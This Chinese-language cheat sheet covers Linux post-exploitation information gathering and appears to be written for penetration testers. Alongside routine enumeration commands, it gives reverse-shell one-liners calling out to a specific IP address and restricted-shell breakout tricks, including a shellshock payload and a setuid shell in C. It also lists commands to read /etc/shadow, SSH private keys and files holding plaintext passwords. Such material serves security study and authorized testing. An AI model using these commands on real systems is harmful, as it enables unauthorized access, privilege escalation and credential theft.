信息收集 - Linux
========================================

获取内核，操作系统和设备信息
----------------------------------------
- PEASS-ng
	- ``https://github.com/carlospolop/PEASS-ng/blob/master/linPEAS/linpeas.sh`` 列举在Linux系统上提升特权的所有可能方法
- LinEnum
	- ``https://github.com/rebootuser/LinEnum`` Linux文件枚举及权限提升检查工具
- 版本信息
    - ``uname -a`` 所有版本
    - ``uname -r`` 内核版本信息
    - ``uname -n`` 系统主机名字
    - ``uname -m`` Linux内核架构
- 内核信息 ``cat /proc/version``
- CPU信息 ``cat /proc/cpuinfo``
- 发布信息
    - ``cat /etc/*-release``
    - ``cat /etc/issue``
- 主机名 ``hostname``
- 文件系统 ``df -a``
- 内核日志 ``dmesg`` / ``/var/log/dmesg``
- 查看当前shell ``echo $0`` ``which sh``
	+ Restricted Shell
	
	::
	
		使用“rbash”，“ - restricted”，“ - r”选项启动任何现有的shell，那么它将成为Restricted shell。
		Restricted Shell将限制用户执行大多数命令和更改当前工作目录。Restricted Shell将对用户施加以下限制。
		1.它不允许您执行cd命令。所以你不能去任何地方。您可以简单地留在当前的工作目录中。
		2.它不允许您修改  $ PATH，$ SHELL，$ BASH_ENV或$ ENV环境变量的值。
		3.它不允许您执行包含/（斜杠）字符的程序。例如，您无法运行/ usr / bin / uname或./uname命令。
		4.您无法使用'重定向输出'>'，'> |'，'<>'，'>＆'，'＆>'，'和'>>'重定向运算符。
		5.它不允许您在脚本中退出受限制的shell模式。
		6.它不允许您使用'set + r'或'set + o restricted'关闭受限制的shell模式。
		常见的受限制 shell 有:rbash、rksh、rsh、lshell.
	
	+ dash
	
	::
	
		当 /bin/sh指向/bin/dash的时候，反弹shell用bash的话必须得这样弹：
		root bash -c "bash -i  >&/dev/tcp/106.13.124.93/2333 0>&1"
		ubuntu中，当不能指定用户名
		bash -c "bash -i  >&/dev/tcp/106.13.124.93/2333 0>&1"
		或者有权限改变/bin/sh的连接指向/bin/bash后：
		ln -s -f /bin/bash /bin/sh
		反弹shell可以用最常见的办法： 
		/bin/bash -i >& /dev/tcp/ip(vps)/7999 0>&1
		
- 突破受限shell
	- 枚举Linux环境
		
	::
	
		枚举是找到突破方法的重要组成部分。我们需要枚举Linux环境来检测为了绕过rbash我们可以做哪些事。
		在正式进行绕过测试之前,我们需要进行以下操作:
		1、首先,我们必须检查可用命令,像cd、ls、echo等
		2、接下来我们要检查常见的操作符,像>、>>、<、|
		3、然后对可用的编程语言进行检查,如perl、ruby、python等
		4、通过sudo -l命令检查我们可以使用root权限运行哪些命令
		5、使用SUID perm检查文件或命令。
		6、使用echo $SHELL命令检查当前使用的是什么shell(90%得到的结果是rbash)
		7、使用env或者printenv命令检查环境变量
		通过以上操作,我们已收集到一些游泳的信息,接下来尝试一下通用的利用方法。
		
	- 通用利用技巧

	::
	
		1、如果"/"命令可用的话,运行/bin/sh或者/bin/bash
		2、运行cp命令,将/bin/sh或者/bin/bash复制到当前目录
		3、在ftp中运行!/bin/sh或者!/bin/bash,如下图所示
		4、在gdb中运行!/bin/sh或者!/bin/bash
		5、在more、man、less中运行!/bin/sh或者!/bin/bash
		6、在vim/vi中运行!/bin/sh或者!/bin/bash
		7、在rvim中执行:python import os; os.system("/bin/bash )
		8、scp -S /path/yourscript x y:
		9、awk 'BEGIN {system("/bin/sh or /bin/bash")}'
		10、find / -name test -exec /bin/sh or /bin/bash \;
		
	- 编程语言技巧
	
	::
	
		1、使用except spawn
		2、python -c 'import os; os.system("/bin/sh")'
		3、php -a then exec("sh -i");
		4、perl -e 'exec "/bin/sh";'
		5、Lua:os.execute('/bin/sh').
		6、ruby:exec "/bin/sh"
		7、python: echo os.system('/bin/bash')
		
	- 高级利用技巧
	
	::
	
		1、ssh username@IP – t "/bin/sh" or "/bin/bash"
		2、ssh username@IP -t "bash –noprofile"
		3、ssh username@IP -t "() { :; }; /bin/bash" (shellshock)
		4、ssh -o ProxyCommand="sh -c /tmp/yourfile.sh" 127.0.0.1 (SUID)
		5、git帮助状态下通过!/bin/bash进入交互式shell
		6、pico -s "/bin/bash"进入编辑器写入/bin/bash然后按ctrl + T键
		7、zip /tmp/test.zip /tmp/test -T –unzip-command="sh -c /bin/bash"
		8、tar cf /dev/null testfile –checkpoint=1 –checkpointaction=exec=/bin/bash
		9、c setuid shell:
		#include <stdlib.h>
		#include <unistd.h>
		#include <stdio.h>
		int main(int argc,char **argv,char **envp)
		{
			setresgid(getegid(),getegid(),getegid());
			setresuid(geteuid(),geteuid(),geteuid());
			
		 execve("/bin/sh",argv,envp);
		 return 0;
		}
			
	- ``ssh guest@x.x.x.x -t "python -c 'import pty;pty.spawn(\"/bin/bash\")'"``

用户和组
----------------------------------------
- 列出系统所有用户 ``cat /etc/passwd``
	::
	
		root:x:0:0::/root:/bin/bash
		bin:x:1:1::/:/usr/bin/nologin
		daemon:x:2:2::/:/usr/bin/nologin
		mail:x:8:12::/var/spool/mail:/usr/bin/nologin
		ftp:x:14:11::/srv/ftp:/usr/bin/nologin
		http:x:33:33::/srv/http:/usr/bin/nologin
		nobody:x:65534:65534:Nobody:/:/usr/bin/nologin
		dbus:x:81:81:System Message Bus:/:/usr/bin/nologin
		systemd-journal-remote:x:981:981:systemd Journal Remote:/:/usr/bin/nologin
		systemd-network:x:980:980:systemd Network Management:/:/usr/bin/nologin
		systemd-oom:x:979:979:systemd Userspace OOM Killer:/:/usr/bin/nologin
		systemd-resolve:x:978:978:systemd Resolver:/:/usr/bin/nologin
		systemd-timesync:x:977:977:systemd Time Synchronization:/:/usr/bin/nologin
		systemd-coredump:x:976:976:systemd Core Dumper:/:/usr/bin/nologin
		uuidd:x:68:68::/:/usr/bin/nologin
		dhcpcd:x:975:975:dhcpcd privilege separation:/:/usr/bin/nologin
		py:x:1000:1000::/home/py:/bin/bash
		git:x:974:974:git daemon user:/:/usr/bin/git-shell
		redis:x:973:973:Redis in-memory data structure store:/var/lib/redis:/usr/bin/nologin
		
		注册名：口令：用户标识号：组标识号：用户名：用户主目录：命令解释程序
		(1)注册名(login_name)：该字段被限制在8个字符(字母或数字)的长度之内,字母大小写是敏感的。
		(2)口令(passwd)：系统用口令来验证用户的合法性。
		现在的Unix/Linux系统中，口令不再直接保存在passwd文件中，通常将passwd文件中的口令字段使
		用一个“x”来代替，将/etc/shadow作为真正的口令文件，用于保存包括个人口令在内的数据。
		如果passwd字段中的第一个字符是“*”的话，表示系统不允许持有该账号的用户登录。 
		(3)用户标识号(UID)：UID是一个数值，是Linux系统中惟一的用户标识，用于区别不同的用户。 
		(4)组标识号(GID)：这是当前用户的缺省工作组标识。
		(5)用户名(user_name)：包含有关用户的一些信息。
		(6)用户主目录(home_directory)：该字段定义了个人用户的主目录。
		(7)命令解释程序(Shell)：通常是一个Shell程序的全路径名，如/bin/bash。 

- 列出系统所有组 ``cat /etc/group``
- 列出所有用户hash（root）``cat /etc/shadow``
	::
	
		root:$6$RucK3DjUUM8TjzYJ$x2etp95bJSiZy6WoJmTd7UomydMfNjo97Heu8nAob9Tji4xzWSzeE0Z2NekZhsyCaA7y/wbzI.2A2xIL/uXV9.:18450:0:99999:7:::
		daemon:*:18440:0:99999:7:::
		bin:*:18440:0:99999:7:::
		sys:*:18440:0:99999:7:::
		sync:*:18440:0:99999:7:::
		games:*:18440:0:99999:7:::
		man:*:18440:0:99999:7:::
		lp:*:18440:0:99999:7:::
		mail:*:18440:0:99999:7:::
		news:*:18440:0:99999:7:::
		uucp:*:18440:0:99999:7:::
		proxy:*:18440:0:99999:7:::
		www-data:*:18440:0:99999:7:::
		backup:*:18440:0:99999:7:::
		list:*:18440:0:99999:7:::
		irc:*:18440:0:99999:7:::
		gnats:*:18440:0:99999:7:::
		nobody:*:18440:0:99999:7:::
		_apt:*:18440:0:99999:7:::
		systemd-timesync:*:18440:0:99999:7:::
		systemd-network:*:18440:0:99999:7:::
		systemd-resolve:*:18440:0:99999:7:::
		messagebus:*:18440:0:99999:7:::
		avahi-autoipd:*:18440:0:99999:7:::
		sshd:*:18440:0:99999:7:::
		avahi:*:18440:0:99999:7:::
		saned:*:18440:0:99999:7:::
		colord:*:18440:0:99999:7:::
		hplip:*:18440:0:99999:7:::
		systemd-coredump:!!:18440::::::
		296640a3b825115a47b68fc44501c828:$6$x4sSRFte6R6BymAn$zrIOVUCwzMlq54EjDjFJ2kfmuN7x2BjKPdir2Fuc9XRRJEk9FNdPliX4Nr92aWzAtykKih5PX39OKCvJZV0us.:18450:0:99999:7:::
		
		文件的格式为：{用户名}：{加密后的口令密码}：{口令最后修改时间距原点(1970-1-1)的天数}：{口令最小修改间隔(防止修改口令，如果时限未到，将恢复至旧口令)：{口令最大修改间隔}：{口令失效前的警告天数}：{账户不活动天数}：{账号失效天数}：{保留}
		其中{加密后的口令密码}的格式为 $id$salt$encrypted
		id为1时，采用md5算法加密
		id为5时，采用SHA256算法加密
		id为6时，采用SHA512算法加密
		salt为盐值,是对密码进行hash的一个干扰值
		encrypted为散列值
	
- 用户
    - 查询用户的基本信息 ``finger``
    - 当前登录的用户 ``users`` ``who -a`` ``/var/log/utmp``
- 目前登录的用户 ``w``
- 登入过的用户信息 ``last`` / ``/var/log/wtmp``
- 显示系统中所有用户最近一次登录信息 ``lastlog`` / ``/var/log/lastlog``
- 登录成功日志 ``/var/log/secure``
- 登录失败日志 ``/var/log/faillog``
- 查看特权用户 ``grep :0 /etc/passwd``
- 查看passwd最后修改时间 ``ls -l /etc/passwd``
- 查看是否存在空口令用户 ``awk -F: 'length($2)==0 {print $1}' /etc/shadow``
- 查看远程登录的账号 ``awk '/\$1|\$6/{print $1}' /etc/shadow``
- 查看具有sudo权限的用户
    - ``cat /etc/sudoers | grep -v "^#\|^$" | grep "ALL=(ALL)"``

用户和权限信息
----------------------------------------
- 当前用户 ``whoami``
- 当前用户信息 ``id``
- 可以使用sudo提升到root的用户（root） ``cat /etc/sudoers``
- 列出目前用户可执行与无法执行的指令 ``sudo -l``

环境信息
----------------------------------------
- 打印系统环境信息 ``env``
- 打印系统环境信息 ``set``
- 环境变量中的路径信息 ``echo  $PATH``
- 打印历史命令 ``history`` / ``~/.bash_history``
- 显示当前路径 ``pwd``
- 显示默认系统遍历 ``cat /etc/profile``
- 显示可用的shell ``cat /etc/shells``

进程信息
----------------------------------------
- 查看进程信息 ``ps aux``
- 资源占有情况 ``top -c``
- 查看进程关联文件 ``lsof -c $PID``

服务信息
----------------------------------------
- 由inetd管理的服务列表 ``cat /etc/inetd.conf``
- 由xinetd管理的服务列表 ``cat /etc/xinetd.conf``
- nfs服务器的配置 ``cat /etc/exports``
- 邮件信息 ``/var/log/mailog``

计划任务
----------------------------------------
- 显示指定用户的计划作业（root） ``crontab -l -u %user%``
- 计划任务
    - ``/var/spool/cron/*``
    - ``/var/spool/anacron/*``
    - ``/etc/crontab``
    - ``/etc/anacrontab``
    - ``/etc/cron.*``
    - ``/etc/anacrontab``
- 开机启动项
    - ``/etc/rc.d/init.d/``

有无明文存放用户密码
----------------------------------------
- grep -i user [filename]
- grep -i pass [filename]
- grep -C 5 "password" [filename]
- find , -name "\*\.php" -print0 | xargs -0 grep -i -n "var \$password"

有无ssh 私钥
----------------------------------------
- cat ~/.ssh/authorized_keys
- cat ~/.ssh/identity.pub
- cat ~/.ssh/identity
- cat ~/.ssh/id_rsa.pub
- cat ~/.ssh/id_rsa
- cat ~/.ssh/id_dsa.pub
- cat ~/.ssh/id_dsa
- cat /etc/ssh/ssh_config
- cat /etc/ssh/sshd_config
- cat /etc/ssh/ssh_host_dsa_key.pub
- cat /etc/ssh/ssh_host_dsa_key
- cat /etc/ssh/ssh_host_rsa_key.pub
- cat /etc/ssh/ssh_host_rsa_key
- cat /etc/ssh/ssh_host_key.pub
- cat /etc/ssh/ssh_host_key


网络、路由和通信
----------------------------------------
- 列出网络接口信息 ``/sbin/ifconfig -a`` / ``ip addr show``
- 列出网络接口信息 ``cat /etc/network/interfaces``
- 查看系统arp表 ``arp -a``
- 打印路由信息 ``route`` / ``ip ro show``
- 查看dns配置信息 ``cat /etc/resolv.conf``
- 打印本地端口开放信息 ``netstat -an``
- 列出iptable的配置规则 ``iptables -L``
- 查看端口服务映射 ``cat /etc/services``
- Hostname ``hostname -f``
- 查看进程端口情况 ``netstat -anltp | grep $PID``

已安装程序
----------------------------------------
- ``rpm -qa --last`` Redhat
- ``yum list | grep installed`` CentOS
- ``ls -l /etc/yum.repos.d/``
- ``dpkg -l`` Debian
- ``cat /etc/apt/sources.list`` Debian APT
- ``pkg_info`` xBSD
- ``pkginfo`` Solaris
- ``pacman -Q`` Arch Linux

文件
----------------------------------------
- 最近五天的文件 ``find / -ctime +1 -ctime -5``
- 文件系统细节 ``debugfs``
